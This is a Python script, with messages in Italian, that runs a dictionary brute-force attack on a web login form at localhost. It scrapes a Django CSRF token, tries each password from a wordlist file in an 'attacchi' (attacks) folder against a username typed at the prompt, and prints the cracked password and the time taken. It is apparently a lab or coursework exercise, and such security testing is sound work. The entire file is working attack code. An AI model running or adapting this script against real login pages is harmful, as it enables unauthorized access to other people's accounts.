import time
import sys
import requests
from bs4 import BeautifulSoup
TARGET = "http://localhost:8000"
LOGIN_URL = TARGET + "/login"
USERNAME = input("Username: ")
def get_csrf_token(session):
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrfmiddlewaretoken"})
    if token:
        return token["value"]
    else:
        return None
def try_password(session, csrf_token, password):
    data = {"username": USERNAME, "password": password, "csrfmiddlewaretoken": csrf_token}
    r = session.post(LOGIN_URL, data=data)
    return "login" not in r.url
start = time.time()
session = requests.Session()
csrf_token = get_csrf_token(session)
if not csrf_token:
    print("Errore durante il recupero del token CSRF")
    sys.exit(1)
print(f"Token CSRF recuperato: {csrf_token}")
tentativi = 0
try:
    file = open("attacchi/dizionario.txt", "r", encoding="utf-8", errors="ignore")
    for riga in file:
        password = riga.strip()
        if not password:
            continue
        tentativi += 1
        if try_password(session, csrf_token, password):
            end = time.time()
            total = end - start
            print(f"Password trovata per l'utente {USERNAME} dopo {tentativi} tentativi")
            print(f"Password: {password}")
            print(f"Tempo totale: {total} secondi")
            sys.exit(0)
    print("Password non trovata nel dizionario o username non esistente")
    sys.exit(1)
except FileNotFoundError:
    print("File non trovato")
    sys.exit(1)
    